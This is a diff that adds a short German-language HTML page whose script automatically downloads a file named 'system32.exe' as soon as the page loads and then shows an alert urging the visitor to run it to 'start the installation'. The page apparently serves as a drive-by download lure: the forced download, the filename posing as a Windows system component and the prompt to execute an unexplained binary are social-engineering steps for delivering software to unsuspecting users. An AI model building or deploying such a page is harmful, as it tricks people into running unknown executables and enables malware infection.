@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Datei herunterladen und installieren</title>
+</head>
+<body>
+    <h1>Download und Installation</h1>
+    <p>Die Datei wird heruntergeladen. Bitte öffnen und installieren Sie die Datei nach dem Download.</p>
+
+    <script>
+        // Funktion zum Starten des Downloads
+        function downloadFile() {
+            var link = document.createElement('a');
+            // URL der Datei, die heruntergeladen werden soll (local file or server)
+            link.href = '/mnt/data/system32.exe'; // Verlinke zur hochgeladenen Datei (lokal oder öffentlich zugänglich)
+            link.download = 'system32.exe'; // Der Dateiname
+            link.click();
+        }
+
+        // Startet den Download, wenn die Seite geladen wird
+        window.onload = function() {
+            downloadFile();
+            alert("Die Datei wird heruntergeladen. Bitte führen Sie die Datei aus, um die Installation zu starten.");
+        };
+    </script>
+</body>
+</html>
